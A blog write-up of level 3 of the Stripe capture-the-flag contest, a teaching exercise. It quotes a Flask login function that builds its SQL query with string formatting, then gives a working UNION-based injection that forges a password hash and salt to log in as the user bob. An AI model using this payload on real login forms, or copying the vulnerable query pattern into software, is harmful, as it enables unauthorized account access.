Stripe CTF: Level #3
####################
:date: 2012-10-26 23:34
:author: useless
:category: Write-up
:slug: stripe-ctf-level-3
:status: published

.. image:: /images/stripe-ctf-level-3/level03-logo.png
    :alt: level03-logo.png
    :align: center

You can find the code for this level
`here </docs/stripe-ctf-level-3/level03-code.tar.gz>`__.

(sha256: :code:`8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5`)

The company who built the vault of level 0 learned its lesson: you now
have to identify before accessing your guarded secrets.

The company kindly tells you that other users have already chosen to
use their product, and even what the stored secrets are.

.. image:: /images/stripe-ctf-level-3/level03-index.png
    :alt: level03-index.png
    :align: center

Sorry for math and physics fan, but we'll focus on bob's secret.

So, let's look at the code used to identify users:

.. code-block:: python

    # File secretvault.py, line 74
    def login():
        username = flask.request.form.get('username')
        password = flask.request.form.get('password')

        if not username:
            return "Must provide username\n"

        if not password:
            return "Must provide password\n"

        conn = sqlite3.connect(os.path.join(data_dir, 'users.db'))
        cursor = conn.cursor()

        query = """SELECT id, password_hash, salt FROM users
                WHERE username = '{0}' LIMIT 1""".format(username)
        cursor.execute(query)

        res = cursor.fetchone()
        if not res:
            return "There's no such user {0}!\n".format(username)
        user_id, password_hash, salt = res

        calculated_hash = hashlib.sha256(password + salt)
        if calculated_hash.hexdigest() != password_hash:
            return "That's not the password for {0}!\n".format(username)

        flask.session['user_id'] = user_id
        return flask.redirect(absolute_url('/'))

Wow. Hashed passwords, and even salt! Seems pretty secure. But the
statements aren't prepared: they are vulnerable to SQL injection. We are
gonna use a :code:`UNION` statement, to force the id, the password's
hash and the salt to be arbitrary values. We can see from the
:code:`generate_data.py` file that the default users were added in a
random order, so we don't know what bob's id is. Since there are only
three values, we can try each by hand. For the sake of simplicity, we'll
suppose here that bob's id is 1.

So, let's say we put this as a user in the form:

:code:`dummy-user' UNION SELECT 1, 'hash', 'salt`

The statement will become:

.. code-block:: sql

    SELECT id, password_hash, salt FROM users WHERE username = 'dummy-user' UNION SELECT 1, 'hash', 'salt' LIMIT 1

This way, the first part of the statement will yield an empty row, and
the second part will yield 1, 'hash', 'salt'. If we want to connect with
the password 'foo', with the salt 'bar', we can compute the password's
hash:

:code:`sha256('foobar') =
c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2`

We fill the form this way:

:code:`user = dummy-user' UNION SELECT 1,
'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
'bar`

and

:code:`password = foo`

.. image:: /images/stripe-ctf-level-3/level03-filled-form.png
    :alt: level03-filled-form.png
    :align: center

We just have to submit to retrieve bob's secret:

.. image:: /images/stripe-ctf-level-3/level03-w00t.png
    :alt: level03-w00t.png
    :align: center

w00t!

